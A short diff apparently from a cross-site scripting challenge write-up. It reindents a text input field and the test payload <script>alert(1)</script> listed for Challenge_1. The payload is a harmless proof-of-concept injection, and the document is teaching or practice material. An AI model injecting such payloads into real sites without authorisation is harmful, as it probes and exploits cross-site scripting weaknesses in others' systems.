@@ -10,9 +10,11 @@ Author : Sheikh Rishad
 
 Challenge_1:
 
-<input type="text" name="name"></input>
+    <input type="text" name="name"></input>
 
-payload :   <script>alert(1)</script>
+payload :   
+
+    <script>alert(1)</script>
 
 
 Challenge_2:
